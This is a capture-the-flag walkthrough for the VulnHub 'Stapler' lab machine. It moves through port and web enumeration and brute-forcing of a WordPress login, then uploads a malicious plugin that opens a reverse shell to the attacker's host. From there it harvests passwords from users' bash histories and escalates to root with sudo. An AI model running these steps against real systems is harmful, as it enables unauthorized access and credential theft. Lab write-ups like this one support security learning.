---
layout: post
title: CTF Stapler
date:   2022-01-14 18:07:29 -0600
categories: CTF
tags: Linux
---
# Discovery

https://www.vulnhub.com/entry/stapler-1,150/

# Scanning
## netdiscover
```zsh
sudo netdiscover
```
![](https://i.imgur.com/pPEuIvU.png)
192.168.0.34

## nmap

```zsh
sudo nmap 192.168.0.34 -sV -p-
```
![](https://i.imgur.com/AoMoifv.jpg)
12 open ports:

## ftp
```zsh
ftp
connect 192.168.0.34
```
Connected to ftp@192.168.0.34.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-

We have a username: `harry`
```
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0,000452 seconds (231 kbytes/s)
```
Let's what is in the note.
```zsh
cat ~/note

`Elly`, make sure you update the payload information. Leave it in your FTP account once your are done, `John`.
Now we have 3 usersneme: harry, Elly and John
We have to connect with Elly to find the `payload information`.
```
## http
### dirb
After a scan on the port 80 we have this:
```zsh
---- Scanning URL: http://192.168.1.27:80/ ----
+ http://192.168.1.27:80/.bashrc (CODE:200|SIZE:3771)
+ http://192.168.1.27:80/.profile (CODE:200|SIZE:675)
```
`.bashrc`
```
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
```
`.profil`
```
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

```
## Browsing
On the port 12380 we have this.
![](https://i.imgur.com/6XecLET.png)
We have this comment: 
` A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! `
![](https://i.imgur.com/WpwMRvM.png)
Now we have 5 usernames:
harry, Elly, Tim, John and Zoe
## Nikto on 12380
```
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ /phpmyadmin/: phpMyAdmin directory found
+ "robots.txt" contains 2 entries which should be manually viewed.
```
You have to entry with https, or it will fail.
In the robots.txt we have `/admin112233/` and `/blogblog/`
https://192.168.0.34:12380/admin112233/:
![](https://i.imgur.com/K08Mju6.png)
https://192.168.0.34:12380/blogblog/:
![](https://i.imgur.com/A7JFwQp.png)
It's using wordpress, here is the login page:
https://192.168.0.34:12380/blogblog/wp-login.php

## wpscan
```zsh
wpscan --disable-tls-checks --url https://192.168.0.34:12380/blogblog/ --enumerate ap --enumerate at --enumerate u --enumerate vp --enumerate cb
```
Upload directory has listing enabled: https://192.168.0.34:12380/blogblog/wp-content/uploads/
WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).

```zsh
wpscan --disable-tls-checks --url https://192.168.0.34:12380/blogblog/ --enumerate u
```
We have some users.
tim, kathy, scott, heather, peter, elly, barry, harry, John Smith, john, garry
The main user is john:
![](https://i.imgur.com/grHvJdS.png)
wpscan --url https://192.168.0.34:12380/blogblog/ --wordlist ~/Documents/wordlist/rockyou.txt --username John --threads 100
It's not working

## Port 666
On the port 666 we have this.

![](https://i.imgur.com/zV3MsmS.png)

## Port 139

139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

It's a samba server.
![](https://i.imgur.com/2WLCCjG.png)
I found nothing interesting in the backups.
You can also use nautilus to download and browse in the smb server.
# Exploit
## Brute force metasploit

I've done a bruteforce with metasploit with the wordlist rockyou and the user john, because he is the one who manage the website.
The password is `incorrect`.

## upload a revers shell

You can upload files in wordpress.
https://192.168.0.34:12380/blogblog/wp-admin/plugin-install.php?tab=upload

I'v tried with this one:
https://docs.j7k6.org/wordpress-malicious-plugin-reverse-shell-metasploit/

```zsh
wget https://raw.githubusercontent.com/wetw0rk/malicious-wordpress-plugin/master/wordpwn.py
python wordpwn.py 192.168.0.21 4444 Y
```
Then, unzip the file and upload `wetw0rk_maybe.php`
Open it via this link:
https://192.168.0.34:12380/blogblog/wp-content/uploads/

Now you should have a meterpreter.
![](https://i.imgur.com/PVopOep.png)

## linenum.sh
```
    Hostname: red.initech
       Linux: 4.4.0-21-generic
Distribution: Ubuntu 16.04 LTS
==================================================================( users )=====
[*] usr020 Are there other users in administrative groups?................. yes!
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[*] fst080 Can we read subdirectories under /home?......................... yes!
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!

```

I think the kernel can be exploited but I have to finish the reco first.
```zsh
find /home
```
peter is diferent, I think he can use sudo.
/home/peter/.sudo_as_admin_successful

Let's see deeper.
```zsh
cat /home/*/.bash_hi*
```
![](https://i.imgur.com/tKGXB5R.png)
We have JKanode and peter, peter can use sudo so let's go for peter.
```   
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
```
## SSH peter
```zsh
ssh peter@192.168.0.34
JZQuyIN5
```
## Enum sudo
```zsh
sudo -l
```
```
User peter may run the following commands on red:
    (ALL : ALL) ALL
```
```zsh
sudo su
```
We are root.
![](https://i.imgur.com/RHYUmp7.png)
Let's get this flag.
![](https://i.imgur.com/2ggYBPH.png)












